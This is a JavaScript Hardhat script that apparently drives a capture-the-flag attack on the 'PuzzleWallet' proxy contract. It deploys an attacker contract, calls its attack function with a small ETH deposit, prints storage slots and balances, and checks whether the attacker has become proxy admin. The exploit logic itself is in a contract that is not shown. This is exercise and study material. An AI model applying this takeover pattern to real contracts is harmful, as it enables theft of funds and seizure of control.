const { expect } = require("chai")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let admin, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xcBea92eB7FA003DBE1fbC6bD738C4CD8f0f93BDb"
    let target = await ethers.getContractAt("PuzzleWallet", instanceAddress)
    let targetProxy = await ethers.getContractAt("PuzzleProxy", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "PuzzleWalletAttcker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    console.log("Initial Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }

    tx = await attackerContract.attack({
        value: ethers.utils.parseEther("0.001"),
    })
    await tx.wait(1)
    let bal = ethers.utils.formatEther(
        (await ethers.provider.getBalance(instanceAddress)).toString()
    )
    let attackerBal = ethers.utils.formatEther(
        (await target.balances(attackerContract.address)).toString()
    )
    console.log(`Balance of contract: ${bal} ETH`)
    console.log(`Attacker Contract balance in target: ${attackerBal} ETH`)

    let owner = await target.owner()
    console.log(`Owner of contract: ${owner}`)

    console.log("Final Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }

    // Check
    admin = await targetProxy.admin()
    if (admin == attacker.address) {
        console.log(`${symbols.success} Pwned Proxy contract!`)
    } else {
        console.log(`${symbols.error} Proxy still has admin as ${admin}`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
